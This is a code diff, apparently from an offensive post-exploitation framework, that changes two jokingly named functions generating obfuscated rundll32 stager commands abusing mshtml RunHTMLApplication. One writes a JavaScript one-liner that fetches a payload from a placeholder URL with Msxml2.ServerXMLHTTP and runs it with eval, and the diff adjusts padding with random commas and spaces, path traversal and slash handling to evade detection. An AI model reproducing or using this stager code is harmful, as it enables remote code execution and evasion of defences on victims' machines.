@@ -39,15 +39,12 @@ def pay_no_attention():
 
     bignumber = 20
 
-    coin = [True,False]
     command = "rundll32"
-    if random.choice(coin):
-        command += ".exe"
     command += " ~URL~"
 
     dotpath = []
 
-    for i in range(0, random.randint(3,6)):
+    for i in range(0, 3):
         dotpath.append('..')
 
     for i in range(0, bignumber):
@@ -56,25 +53,17 @@ def pay_no_attention():
     random.shuffle(dotpath)
 
     path = ""
-    slashes = ["\\", "/"]
     dotpathwithslashes = []
     for i in dotpath:
-        dotpathwithslashes.append(random.choice(slashes) + i)
-
-    for i in range(0, bignumber):
-        dotpathwithslashes.append(random.choice(slashes))
-
-    random.shuffle(dotpathwithslashes)
+        dotpathwithslashes.append("\\" + i)
 
     path = ''.join(dotpathwithslashes)
-    path += random.choice(slashes)
+    path += "\\"
 
     command += path + "mshtml"
-    if random.choice(coin):
-        command += ".dll"
+    command += ''.join([random.choice([',',' ']) for i in range(0,random.randint(20,40))])
     command += ","
-    if random.choice(coin):
-        command += " "
+    command += " "
     command += "RunHTMLApplication"
 
     with open('data/stager/js/rundll32/rundll32.cmd', 'w') as f:
@@ -88,8 +77,6 @@ def seriously_nothing_shady_here():
 
     coin = [True,False]
     command = "rundll32"
-    if random.choice(coin):
-        command += ".exe"
     command += " javascript:\""
 
     dotpath = []
@@ -103,17 +90,12 @@ def seriously_nothing_shady_here():
     random.shuffle(dotpath)
 
     path = ""
-    slashes = ["\\", "/"]
+    slashes = ["\\"]
     dotpathwithslashes = []
-    if random.choice(coin):
-        dotpathwithslashes.append(dotpath[0])
-        dotpath = dotpath[1:]
 
     for i in dotpath:
         dotpathwithslashes.append(random.choice(slashes) + i)
 
-    for i in range(0, bignumber):
-        dotpathwithslashes.append(random.choice(slashes))
     if dotpathwithslashes[0] == '..' or dotpathwithslashes[0] == '.':
         tmp = dotpathwithslashes[0]
         dotpathwithslashes = dotpathwithslashes[1:]
@@ -126,11 +108,9 @@ def seriously_nothing_shady_here():
     path += random.choice(slashes)
 
     command += path + "mshtml"
-    if random.choice(coin):
-        command += ".dll"
+    command += ''.join([random.choice([',',' ']) for i in range(0,random.randint(20,40))])
     command += ","
-    if random.choice(coin):
-        command += " "
+    command += " "
     command += "RunHTMLApplication \";x=new%20ActiveXObject(\"Msxml2.ServerXMLHTTP.6.0\");x.open(\"GET\",\"~URL~\",false);x.send();eval(x.responseText);window.close();"
 
     with open('data/stager/js/rundll32_js/rundll32_js.cmd', 'w') as f:
